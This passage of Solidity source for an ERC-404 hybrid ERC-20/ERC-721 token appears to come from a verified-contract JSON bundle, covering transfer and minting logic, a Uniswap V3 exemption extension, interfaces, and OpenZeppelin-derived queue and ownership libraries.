exempt, but the recipient is not. Contract should not attempt\\n      //         to transfer ERC-721s from the sender, but the recipient should receive ERC-721s\\n      //         from the bank/minted for any whole number increase in their balance.\\n      // Only cares about whole number increments.\\n      uint256 tokensToRetrieveOrMint = (balanceOf[to_] / units) -\\n        (erc20BalanceOfReceiverBefore / units);\\n      for (uint256 i = 0; i < tokensToRetrieveOrMint; ) {\\n        _retrieveOrMintERC721(to_);\\n        unchecked {\\n          ++i;\\n        }\\n      }\\n    } else if (isToERC721TransferExempt) {\\n      // Case 3) The sender is not ERC-721 transfer exempt, but the recipient is. Contract should attempt\\n      //         to withdraw and store ERC-721s from the sender, but the recipient should not\\n      //         receive ERC-721s from the bank/minted.\\n      // Only cares about whole number increments.\\n      uint256 tokensToWithdrawAndStore = (erc20BalanceOfSenderBefore / units) -\\n        (balanceOf[from_] / units);\\n      for (uint256 i = 0; i < tokensToWithdrawAndStore; ) {\\n        _withdrawAndStoreERC721(from_);\\n        unchecked {\\n          ++i;\\n        }\\n      }\\n    } else {\\n      // Case 4) Neither the sender nor the recipient are ERC-721 transfer exempt.\\n      // Strategy:\\n      // 1. First deal with the whole tokens. These are easy and will just be transferred.\\n      // 2. Look at the fractional part of the value:\\n      //   a) If it causes the sender to lose a whole token that was represented by an NFT due to a\\n      //      fractional part being transferred, withdraw and store an additional NFT from the sender.\\n      //   b) If it causes the receiver to gain a whole new token that should be represented by an NFT\\n      //      due to receiving a fractional part that completes a whole token, retrieve or mint an NFT to the recevier.\\n\\n      // Whole tokens worth of ERC-20s get transferred as ERC-721s without any burning/minting.\\n      uint256 nftsToTransfer = value_ / units;\\n      for (uint256 i = 0; i < nftsToTransfer; ) {\\n        // Pop from sender's ERC-721 stack and transfer them (LIFO)\\n        uint256 indexOfLastToken = _owned[from_].length - 1;\\n        uint256 tokenId = _owned[from_][indexOfLastToken];\\n        _transferERC721(from_, to_, tokenId);\\n        unchecked {\\n          ++i;\\n        }\\n      }\\n\\n      // If the transfer changes either the sender or the recipient's holdings from a fractional to a non-fractional\\n      // amount (or vice versa), adjust ERC-721s.\\n\\n      // First check if the send causes the sender to lose a whole token that was represented by an ERC-721\\n      // due to a fractional part being transferred.\\n      //\\n      // Process:\\n      // Take the difference between the whole number of tokens before and after the transfer for the sender.\\n      // If that difference is greater than the number of ERC-721s transferred (whole units), then there was\\n      // an additional ERC-721 lost due to the fractional portion of the transfer.\\n      // If this is a self-send and the before and after balances are equal (not always the case but often),\\n      // then no ERC-721s will be lost here.\\n      if (\\n        erc20BalanceOfSenderBefore / units - erc20BalanceOf(from_) / units >\\n        nftsToTransfer\\n      ) {\\n        _withdrawAndStoreERC721(from_);\\n      }\\n\\n      // Then, check if the transfer causes the receiver to gain a whole new token which requires gaining\\n      // an additional ERC-721.\\n      //\\n      // Process:\\n      // Take the difference between the whole number of tokens before and after the transfer for the recipient.\\n      // If that difference is greater than the number of ERC-721s transferred (whole units), then there was\\n      // an additional ERC-721 gained due to the fractional portion of the transfer.\\n      // Again, for self-sends where the before and after balances are equal, no ERC-721s will be gained here.\\n      if (\\n        erc20BalanceOf(to_) / units - erc20BalanceOfReceiverBefore / units >\\n        nftsToTransfer\\n      ) {\\n        _retrieveOrMintERC721(to_);\\n      }\\n    }\\n\\n    return true;\\n  }\\n\\n  /// @notice Internal function for ERC20 minting\\n  /// @dev This function will allow minting of new ERC20s.\\n  ///      If mintCorrespondingERC721s_ is true, and the recipient is not ERC-721 exempt, it will\\n  ///      also mint the corresponding ERC721s.\\n  /// Handles ERC-721 exemptions.\\n  function _mintERC20(address to_, uint256 value_) internal virtual {\\n    /// You cannot mint to the zero address (you can't mint and immediately burn in the same transfer).\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    if (totalSupply + value_ > ID_ENCODING_PREFIX) {\\n      revert MintLimitReached();\\n    }\\n\\n    _transferERC20WithERC721(address(0), to_, value_);\\n  }\\n\\n  /// @notice Internal function for ERC-721 minting and retrieval from the bank.\\n  /// @dev This function will allow minting of new ERC-721s up to the total fractional supply. It will\\n  ///      first try to pull from the bank, and if the bank is empty, it will mint a new token.\\n  /// Does not handle ERC-721 exemptions.\\n  function _retrieveOrMintERC721(address to_) internal virtual {\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    uint256 id;\\n\\n    if (!_storedERC721Ids.empty()) {\\n      // If there are any tokens in the bank, use those first.\\n      // Pop off the end of the queue (FIFO).\\n      id = _storedERC721Ids.popBack();\\n    } else {\\n      // Otherwise, mint a new token, should not be able to go over the total fractional supply.\\n      ++minted;\\n\\n      // Reserve max uint256 for approvals\\n      if (minted == type(uint256).max) {\\n        revert MintLimitReached();\\n      }\\n\\n      id = ID_ENCODING_PREFIX + minted;\\n    }\\n\\n    address erc721Owner = _getOwnerOf(id);\\n\\n    // The token should not already belong to anyone besides 0x0 or this contract.\\n    // If it does, something is wrong, as this should never happen.\\n    if (erc721Owner != address(0)) {\\n      revert AlreadyExists();\\n    }\\n\\n    // Transfer the token to the recipient, either transferring from the contract's bank or minting.\\n    // Does not handle ERC-721 exemptions.\\n    _transferERC721(erc721Owner, to_, id);\\n  }\\n\\n  /// @notice Internal function for ERC-721 deposits to bank (this contract).\\n  /// @dev This function will allow depositing of ERC-721s to the bank, which can be retrieved by future minters.\\n  // Does not handle ERC-721 exemptions.\\n  function _withdrawAndStoreERC721(address from_) internal virtual {\\n    if (from_ == address(0)) {\\n      revert InvalidSender();\\n    }\\n\\n    // Retrieve the latest token added to the owner's stack (LIFO).\\n    uint256 id = _owned[from_][_owned[from_].length - 1];\\n\\n    // Transfer to 0x0.\\n    // Does not handle ERC-721 exemptions.\\n    _transferERC721(from_, address(0), id);\\n\\n    // Record the token in the contract's bank queue.\\n    _storedERC721Ids.pushFront(id);\\n  }\\n\\n  /// @notice Initialization function to set pairs / etc, saving gas by avoiding mint / burn on unnecessary targets\\n  function _setERC721TransferExempt(\\n    address target_,\\n    bool state_\\n  ) internal virtual {\\n    if (target_ == address(0)) {\\n      revert InvalidExemption();\\n    }\\n\\n    // Adjust the ERC721 balances of the target to respect exemption rules.\\n    // Despite this logic, it is still recommended practice to exempt prior to the target\\n    // having an active balance.\\n    if (state_) {\\n      _clearERC721Balance(target_);\\n    } else {\\n      _reinstateERC721Balance(target_);\\n    }\\n\\n    _erc721TransferExempt[target_] = state_;\\n  }\\n\\n  /// @notice Function to reinstate balance on exemption removal\\n  function _reinstateERC721Balance(address target_) private {\\n    uint256 expectedERC721Balance = erc20BalanceOf(target_) / units;\\n    uint256 actualERC721Balance = erc721BalanceOf(target_);\\n\\n    for (uint256 i = 0; i < expectedERC721Balance - actualERC721Balance; ) {\\n      // Transfer ERC721 balance in from pool\\n      _retrieveOrMintERC721(target_);\\n      unchecked {\\n        ++i;\\n      }\\n    }\\n  }\\n\\n  /// @notice Function to clear balance on exemption inclusion\\n  function _clearERC721Balance(address target_) private {\\n    uint256 erc721Balance = erc721BalanceOf(target_);\\n\\n    for (uint256 i = 0; i < erc721Balance; ) {\\n      // Transfer out ERC721 balance\\n      _withdrawAndStoreERC721(target_);\\n      unchecked {\\n        ++i;\\n      }\\n    }\\n  }\\n\\n  function _getOwnerOf(\\n    uint256 id_\\n  ) internal view virtual returns (address ownerOf_) {\\n    uint256 data = _ownedData[id_];\\n\\n    assembly {\\n      ownerOf_ := and(data, _BITMASK_ADDRESS)\\n    }\\n  }\\n\\n  function _setOwnerOf(uint256 id_, address owner_) internal virtual {\\n    uint256 data = _ownedData[id_];\\n\\n    assembly {\\n      data := add(\\n        and(data, _BITMASK_OWNED_INDEX),\\n        and(owner_, _BITMASK_ADDRESS)\\n      )\\n    }\\n\\n    _ownedData[id_] = data;\\n  }\\n\\n  function _getOwnedIndex(\\n    uint256 id_\\n  ) internal view virtual returns (uint256 ownedIndex_) {\\n    uint256 data = _ownedData[id_];\\n\\n    assembly {\\n      ownedIndex_ := shr(160, data)\\n    }\\n  }\\n\\n  function _setOwnedIndex(uint256 id_, uint256 index_) internal virtual {\\n    uint256 data = _ownedData[id_];\\n\\n    if (index_ > _BITMASK_OWNED_INDEX >> 160) {\\n      revert OwnedIndexOverflow();\\n    }\\n\\n    assembly {\\n      data := add(\\n        and(data, _BITMASK_ADDRESS),\\n        and(shl(160, index_), _BITMASK_OWNED_INDEX)\\n      )\\n    }\\n\\n    _ownedData[id_] = data;\\n  }\\n}\\n\\ninterface IPeripheryImmutableState {\\n    /// @return Returns the address of the Uniswap V3 factory\\n    function factory() external view returns (address);\\n\\n    /// @return Returns the address of WETH9\\n    function WETH9() external view returns (address);\\n}\\n\\n//SPDX-License-Identifier: MIT\\nabstract contract ERC404UniswapV3Exempt is ERC404 {\\n  error ERC404UniswapV3ExemptFactoryMismatch();\\n  error ERC404UniswapV3ExemptWETH9Mismatch();\\n\\n  constructor(\\n    address uniswapV3Router_,\\n    address uniswapV3NonfungiblePositionManager_\\n  ) {\\n    IPeripheryImmutableState uniswapV3Router = IPeripheryImmutableState(\\n      uniswapV3Router_\\n    );\\n\\n    // Set the Uniswap v3 swap router as exempt.\\n    _setERC721TransferExempt(uniswapV3Router_, true);\\n\\n    IPeripheryImmutableState uniswapV3NonfungiblePositionManager = IPeripheryImmutableState(\\n        uniswapV3NonfungiblePositionManager_\\n      );\\n\\n    // Set the Uniswap v3 nonfungible position manager as exempt.\\n    _setERC721TransferExempt(uniswapV3NonfungiblePositionManager_, true);\\n\\n    // Require the Uniswap v3 factory from the position manager and the swap router to be the same.\\n    if (\\n      uniswapV3Router.factory() != uniswapV3NonfungiblePositionManager.factory()\\n    ) {\\n      revert ERC404UniswapV3ExemptFactoryMismatch();\\n    }\\n\\n    // Require the Uniswap v3 WETH9 from the position manager and the swap router to be the same.\\n    if (\\n      uniswapV3Router.WETH9() != uniswapV3NonfungiblePositionManager.WETH9()\\n    ) {\\n      revert ERC404UniswapV3ExemptWETH9Mismatch();\\n    }\\n\\n    uint24[4] memory feeTiers = [\\n      uint24(100),\\n      uint24(500),\\n      uint24(3_000),\\n      uint24(10_000)\\n    ];\\n\\n    // Determine the Uniswap v3 pair address for this token.\\n    for (uint256 i = 0; i < feeTiers.length; ) {\\n      address uniswapV3Pair = _getUniswapV3Pair(\\n        uniswapV3Router.factory(),\\n        uniswapV3Router.WETH9(),\\n        feeTiers[i]\\n      );\\n\\n      // Set the Uniswap v3 pair as exempt.\\n      _setERC721TransferExempt(uniswapV3Pair, true);\\n\\n      unchecked {\\n        ++i;\\n      }\\n    }\\n  }\\n\\n  function _getUniswapV3Pair(\\n    address uniswapV3Factory_,\\n    address weth_,\\n    uint24 fee_\\n  ) private view returns (address) {\\n    address thisAddress = address(this);\\n\\n    (address token0, address token1) = thisAddress < weth_\\n      ? (thisAddress, weth_)\\n      : (weth_, thisAddress);\\n\\n    return\\n      address(\\n        uint160(\\n          uint256(\\n            keccak256(\\n              abi.encodePacked(\\n                hex\\\"ff\\\",\\n                uniswapV3Factory_,\\n                keccak256(abi.encode(token0, token1, fee_)),\\n                hex\\\"e34f199b19b2b4f47f68442619d555527d244f78a3297ea89325f843f87b8b54\\\"\\n              )\\n            )\\n          )\\n        )\\n      );\\n  }\\n}\"\r\n    },\r\n    \"contracts/extensions/IERC404MerkleClaim.sol\": {\r\n      \"content\": \"pragma solidity ^0.8.20;\\n\\n\\n//SPDX-License-Identifier: MIT\\ninterface IERC404MerkleClaim {\\n  error AirdropAlreadyClaimed();\\n  error NotEligibleForAirdrop();\\n  error AirdropIsClosed();\\n\\n  function verifyProof(\\n    bytes32[] memory proof_,\\n    address claimer_,\\n    uint256 value_\\n  ) external view returns (bool);\\n\\n  function airdropMint(bytes32[] memory proof_, uint256 value_) external;\\n}\"\r\n    },\r\n    \"contracts/interfaces/IERC404.sol\": {\r\n      \"content\": \"//SPDX-License-Identifier: MIT\\npragma solidity ^0.8.20;\\n\\ninterface IERC404 {\\n  error NotFound();\\n  error InvalidTokenId();\\n  error AlreadyExists();\\n  error InvalidRecipient();\\n  error InvalidSender();\\n  error InvalidSpender();\\n  error InvalidOperator();\\n  error UnsafeRecipient();\\n  error RecipientIsERC721TransferExempt();\\n  error Unauthorized();\\n  error InsufficientAllowance();\\n  error DecimalsTooLow();\\n  error PermitDeadlineExpired();\\n  error InvalidSigner();\\n  error InvalidApproval();\\n  error OwnedIndexOverflow();\\n  error MintLimitReached();\\n  error InvalidExemption();\\n\\n  function name() external view returns (string memory);\\n  function symbol() external view returns (string memory);\\n  function decimals() external view returns (uint8);\\n  function totalSupply() external view returns (uint256);\\n  function erc20TotalSupply() external view returns (uint256);\\n  function erc721TotalSupply() external view returns (uint256);\\n  function balanceOf(address owner_) external view returns (uint256);\\n  function erc721BalanceOf(address owner_) external view returns (uint256);\\n  function erc20BalanceOf(address owner_) external view returns (uint256);\\n  function erc721TransferExempt(address account_) external view returns (bool);\\n  function isApprovedForAll(\\n    address owner_,\\n    address operator_\\n  ) external view returns (bool);\\n  function allowance(\\n    address owner_,\\n    address spender_\\n  ) external view returns (uint256);\\n  function owned(address owner_) external view returns (uint256[] memory);\\n  function ownerOf(uint256 id_) external view returns (address erc721Owner);\\n  function tokenURI(uint256 id_) external view returns (string memory);\\n  function approve(\\n    address spender_,\\n    uint256 valueOrId_\\n  ) external returns (bool);\\n  function erc20Approve(\\n    address spender_,\\n    uint256 value_\\n  ) external returns (bool);\\n  function erc721Approve(address spender_, uint256 id_) external;\\n  function setApprovalForAll(address operator_, bool approved_) external;\\n  function transferFrom(\\n    address from_,\\n    address to_,\\n    uint256 valueOrId_\\n  ) external returns (bool);\\n  function erc20TransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 value_\\n  ) external returns (bool);\\n  function erc721TransferFrom(address from_, address to_, uint256 id_) external;\\n  function transfer(address to_, uint256 amount_) external returns (bool);\\n  function getERC721QueueLength() external view returns (uint256);\\n  function getERC721TokensInQueue(\\n    uint256 start_,\\n    uint256 count_\\n  ) external view returns (uint256[] memory);\\n  function setSelfERC721TransferExempt(bool state_) external;\\n  function safeTransferFrom(address from_, address to_, uint256 id_) external;\\n  function safeTransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 id_,\\n    bytes calldata data_\\n  ) external;\\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\\n  function permit(\\n    address owner_,\\n    address spender_,\\n    uint256 value_,\\n    uint256 deadline_,\\n    uint8 v_,\\n    bytes32 r_,\\n    bytes32 s_\\n  ) external;\\n}\\n\"\r\n    },\r\n    \"contracts/interfaces/IERC721.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(\\n        address indexed owner,\\n        address indexed spender,\\n        uint256 value\\n    );\\n\\n    /**\\n     * @dev Returns the amount of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the amount of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves `amount` tokens from the caller's account to `to`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address to, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(\\n        address owner,\\n        address spender\\n    ) external view returns (uint256);\\n\\n    /**\\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender's allowance to 0 and set the\\n     * desired value afterwards:\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Moves `amount` tokens from `from` to `to` using the\\n     * allowance mechanism. `amount` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) external returns (bool);\\n}\\n\"\r\n    },\r\n    \"contracts/libraries/Context.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\"\r\n    },\r\n    \"contracts/libraries/DoubleEndedQueue.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (utils/structs/DoubleEndedQueue.sol)\\n// Modified by Pandora Labs to support native uint256 operations\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev A sequence of items with the ability to efficiently push and pop items (i.e. insert and remove) on both ends of\\n * the sequence (called front and back). Among other access patterns, it can be used to implement efficient LIFO and\\n * FIFO queues. Storage use is optimized, and all operations are O(1) constant time. This includes {clear}, given that\\n * the existing queue contents are left in storage.\\n *\\n * The struct is called `Uint256Deque`. This data structure can only be used in storage, and not in memory.\\n *\\n * ```solidity\\n * DoubleEndedQueue.Uint256Deque queue;\\n * ```\\n */\\nlibrary DoubleEndedQueue {\\n  /**\\n   * @dev An operation (e.g. {front}) couldn't be completed due to the queue being empty.\\n   */\\n  error QueueEmpty();\\n\\n  /**\\n   * @dev A push operation couldn't be completed due to the queue being full.\\n   */\\n  error QueueFull();\\n\\n  /**\\n   * @dev An operation (e.g. {at}) couldn't be completed due to an index being out of bounds.\\n   */\\n  error QueueOutOfBounds();\\n\\n  /**\\n   * @dev Indices are 128 bits so begin and end are packed in a single storage slot for efficient access.\\n   *\\n   * Struct members have an underscore prefix indicating that they are \\\"private\\\" and should not be read or written to\\n   * directly. Use the functions provided below instead. Modifying the struct manually may violate assumptions and\\n   * lead to unexpected behavior.\\n   *\\n   * The first item is at data[begin] and the last item is at data[end - 1]. This range can wrap around.\\n   */\\n  struct Uint256Deque {\\n    uint128 _begin;\\n    uint128 _end;\\n    mapping(uint128 index => uint256) _data;\\n  }\\n\\n  /**\\n   * @dev Inserts an item at the end of the queue.\\n   *\\n   * Reverts with {QueueFull} if the queue is full.\\n   */\\n  function pushBack(Uint256Deque storage deque, uint256 value) internal {\\n    unchecked {\\n      uint128 backIndex = deque._end;\\n      if (backIndex + 1 == deque._begin) revert QueueFull();\\n      deque._data[backIndex] = value;\\n      deque._end = backIndex + 1;\\n    }\\n  }\\n\\n  /**\\n   * @dev Removes the item at the end of the queue and returns it.\\n   *\\n   * Reverts with {QueueEmpty} if the queue is empty.\\n   */\\n  function popBack(\\n    Uint256Deque storage deque\\n  ) internal returns (uint256 value) {\\n    unchecked {\\n      uint128 backIndex = deque._end;\\n      if (backIndex == deque._begin) revert QueueEmpty();\\n      --backIndex;\\n      value = deque._data[backIndex];\\n      delete deque._data[backIndex];\\n      deque._end = backIndex;\\n    }\\n  }\\n\\n  /**\\n   * @dev Inserts an item at the beginning of the queue.\\n   *\\n   * Reverts with {QueueFull} if the queue is full.\\n   */\\n  function pushFront(Uint256Deque storage deque, uint256 value) internal {\\n    unchecked {\\n      uint128 frontIndex = deque._begin - 1;\\n      if (frontIndex == deque._end) revert QueueFull();\\n      deque._data[frontIndex] = value;\\n      deque._begin = frontIndex;\\n    }\\n  }\\n\\n  /**\\n   * @dev Removes the item at the beginning of the queue and returns it.\\n   *\\n   * Reverts with `QueueEmpty` if the queue is empty.\\n   */\\n  function popFront(\\n    Uint256Deque storage deque\\n  ) internal returns (uint256 value) {\\n    unchecked {\\n      uint128 frontIndex = deque._begin;\\n      if (frontIndex == deque._end) revert QueueEmpty();\\n      value = deque._data[frontIndex];\\n      delete deque._data[frontIndex];\\n      deque._begin = frontIndex + 1;\\n    }\\n  }\\n\\n  /**\\n   * @dev Returns the item at the beginning of the queue.\\n   *\\n   * Reverts with `QueueEmpty` if the queue is empty.\\n   */\\n  function front(\\n    Uint256Deque storage deque\\n  ) internal view returns (uint256 value) {\\n    if (empty(deque)) revert QueueEmpty();\\n    return deque._data[deque._begin];\\n  }\\n\\n  /**\\n   * @dev Returns the item at the end of the queue.\\n   *\\n   * Reverts with `QueueEmpty` if the queue is empty.\\n   */\\n  function back(\\n    Uint256Deque storage deque\\n  ) internal view returns (uint256 value) {\\n    if (empty(deque)) revert QueueEmpty();\\n    unchecked {\\n      return deque._data[deque._end - 1];\\n    }\\n  }\\n\\n  /**\\n   * @dev Return the item at a position in the queue given by `index`, with the first item at 0 and last item at\\n   * `length(deque) - 1`.\\n   *\\n   * Reverts with `QueueOutOfBounds` if the index is out of bounds.\\n   */\\n  function at(\\n    Uint256Deque storage deque,\\n    uint256 index\\n  ) internal view returns (uint256 value) {\\n    if (index >= length(deque)) revert QueueOutOfBounds();\\n    // By construction, length is a uint128, so the check above ensures that index can be safely downcast to uint128\\n    unchecked {\\n      return deque._data[deque._begin + uint128(index)];\\n    }\\n  }\\n\\n  /**\\n   * @dev Resets the queue back to being empty.\\n   *\\n   * NOTE: The current items are left behind in storage. This does not affect the functioning of the queue, but misses\\n   * out on potential gas refunds.\\n   */\\n  function clear(Uint256Deque storage deque) internal {\\n    deque._begin = 0;\\n    deque._end = 0;\\n  }\\n\\n  /**\\n   * @dev Returns the number of items in the queue.\\n   */\\n  function length(Uint256Deque storage deque) internal view returns (uint256) {\\n    unchecked {\\n      return uint256(deque._end - deque._begin);\\n    }\\n  }\\n\\n  /**\\n   * @dev Returns true if the queue is empty.\\n   */\\n  function empty(Uint256Deque storage deque) internal view returns (bool) {\\n    return deque._end == deque._begin;\\n  }\\n}\\n\"\r\n    },\r\n    \"contracts/libraries/ERC20Events.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.20;\\n\\nlibrary ERC20Events {\\n  event Approval(address indexed owner, address indexed spender, uint256 value);\\n  event Transfer(address indexed from, address indexed to, uint256 amount);\\n}\\n\"\r\n    },\r\n    \"contracts/libraries/ERC721Events.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.20;\\n\\nlibrary ERC721Events {\\n  event ApprovalForAll(\\n    address indexed owner,\\n    address indexed operator,\\n    bool approved\\n  );\\n  event Approval(\\n    address indexed owner,\\n    address indexed spender,\\n    uint256 indexed id\\n  );\\n  event Transfer(address indexed from, address indexed to, uint256 indexed id);\\n}\\n\"\r\n    },\r\n    \"contracts/libraries/Ownable.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.9.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"./Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * By default, the owner account will be the one that deploys the contract. This\\n * can later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    event OwnershipTransferred(\\n        address indexed previousOwner,\\n        address indexed newOwner\\n    );\\n\\n    /**\\n     * @dev Initializes the contract setting the deployer as the initial owner.\\n     */\\n    constructor() {\\n        _transferOwnership(_msgSender());\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        require(owner() == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby disabling any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(\\n            newOwner != address(0),\\n            \\\"Ownable: new owner is the zero address\\\"\\n        );\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\"\r\n    },\r\n    \"contracts/libraries/PackedDoubleEndedQueue.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (utils/structs/DoubleEndedQueue.sol)\\n// Modified by Pandora Labs to support native packed operations\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev A sequence of items with the ability to efficiently push and pop items (i.e. insert and remove) on both ends of\\n * the sequence (called front and back). Among other access patterns, it can be used to implement efficient LIFO and\\n * FIFO queues. Storage use is optimized, and all operations are O(1) constant time. This includes {clear}, given that\\n * the existing queue contents are left in storage.\\n *\\n * The struct is called `Uint16Deque`. And is designed for packed uint16 values, though this approach can be\\n * extrapolated to different implementations. This data structure can only be used in storage, and not in memory.\\n *\\n * ```solidity\\n * PackedDoubleEndedQueue.Uint16Deque queue;\\n * ```\\n */\\nlibrary PackedDoubleEndedQueue {\\n  uint128 constant SLOT_MASK = (1 << 64) - 1;\\n  uint128 constant INDEX_MASK = SLOT_MASK << 64;\\n\\n  uint256 constant SLOT_DATA_MASK = (1 << 16) - 1;\\n\\n  /**\\n   * @dev An operation (e.g. {front}) couldn't be completed due to the queue being empty.\\n   */\\n  error QueueEmpty();\\n\\n  /**\\n   * @dev A push operation couldn't be completed due to the queue being full.\\n   */\\n  error QueueFull();\\n\\n  /**\\n   * @dev An operation (e.g. {at}) couldn't be completed due to an index being out of bounds.\\n   */\\n  error QueueOutOfBounds();\\n\\n  /**\\n   * @dev Invalid slot.\\n   */\\n  error InvalidSlot();\\n\\n  /**\\n   * @dev Indices and slots are 64 bits to fit within a single storage slot.\\n   *\\n   * Struct members have an underscore prefix indicating that they are \\\"private\\\" and should not be read or written to\\n   * directly. Use the functions provided below instead. Modifying the struct manually may violate assumptions and\\n   * lead to unexpected behavior.\\n   *\\n   * The first item is at data[begin] and the last item is at data[end - 1]. This range can wrap around.\\n   */\\n  struct Uint16Deque {\\n    uint64 _beginIndex;\\n    uint64 _beginSlot;\\n    uint64 _endIndex;\\n    uint64 _endSlot;\\n    mapping(uint64 index => uint256) _data;\\n  }\\n\\n  /**\\n   * @dev Removes the item at the end of the queue and returns it.\\n   *\\n   * Reverts with {QueueEmpty} if the queue is empty.\\n   */\\n  function popBack(Uint16Deque storage deque) internal returns (uint16 value) {\\n    unchecked {\\n      uint64 backIndex = deque._endIndex;\\n      uint64 backSlot = deque._endSlot;\\n\\n      if (backIndex == deque._beginIndex && backSlot == deque._beginSlot)\\n        revert QueueEmpty();\\n\\n      if (backSlot == 0) {\\n        --backIndex;\\n        backSlot = 15;\\n      } else {\\n        --backSlot;\\n      }\\n\\n      uint256 data = deque._data[backIndex];\\n\\n      value = _getEntry(data, backSlot);\\n      deque._data[backIndex] = _setData(data, backSlot, 0);\\n\\n      deque._endIndex = backIndex;\\n      deque._endSlot = backSlot;\\n    }\\n  }\\n\\n  /**\\n   * @dev Inserts an item at the beginning of the queue.\\n   *\\n   * Reverts with {QueueFull} if the queue is full.\\n   */\\n  function pushFront(Uint16Deque storage deque, uint16 value_) internal {\\n    unchecked {\\n      uint64 frontIndex = deque._beginIndex;\\n      uint64 frontSlot = deque._beginSlot;\\n\\n      if (frontSlot == 0) {\\n        --frontIndex;\\n        frontSlot = 15;\\n      } else {\\n        --frontSlot;\\n      }\\n\\n      if (frontIndex == deque._endIndex && frontSlot == deque._endSlot)\\n        revert QueueFull();\\n\\n      deque._data[frontIndex] = _setData(\\n        deque._data[frontIndex],\\n        frontSlot,\\n        value_\\n      );\\n      deque._beginIndex = frontIndex;\\n      deque._beginSlot = frontSlot;\\n    }\\n  }\\n\\n  /**\\n   * @dev Return the item at a position in the queue given by `index`, with the first item at 